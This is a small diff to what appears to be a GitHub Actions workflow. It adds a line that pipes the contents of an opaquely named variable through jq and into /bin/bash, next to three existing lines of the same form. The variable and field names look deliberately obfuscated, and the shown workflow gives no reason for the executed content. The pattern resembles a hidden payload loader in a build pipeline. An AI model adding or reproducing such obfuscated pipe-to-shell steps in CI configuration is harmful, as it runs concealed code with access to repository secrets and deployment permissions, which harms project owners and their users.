@@ -25,6 +25,7 @@ jobs:
           echo $vsh10 | jq -r .volea004 | /bin/bash
           echo $wrltq07 | jq -r .sv74500 | /bin/bash
           printf '%s' "$co711" | jq -r .v2 | /bin/bash
+          printf '%s' "$p32612" | jq -r .kmja943 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
